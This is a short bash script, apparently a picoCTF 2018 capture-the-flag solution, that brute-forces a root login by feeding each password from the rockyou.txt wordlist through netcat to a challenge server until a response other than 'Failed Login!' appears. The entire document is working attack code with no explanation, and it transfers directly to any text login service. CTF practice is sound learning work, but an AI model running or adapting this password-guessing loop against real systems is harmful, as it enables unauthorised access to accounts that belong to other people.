#!/bin/bash
input="rockyou.txt"
while read line
  do
    A=`(echo "root" ; echo "$line";) | nc 2018shell.picoctf.com 35225`
#    echo $A $line >> output_log.txt
    echo "testing $line"
    if [ "$A" != "Username: Password: Failed Login!" ]; then
	echo "Answer is $line"
	echo "$A"
	exit 1
    fi
done < $input
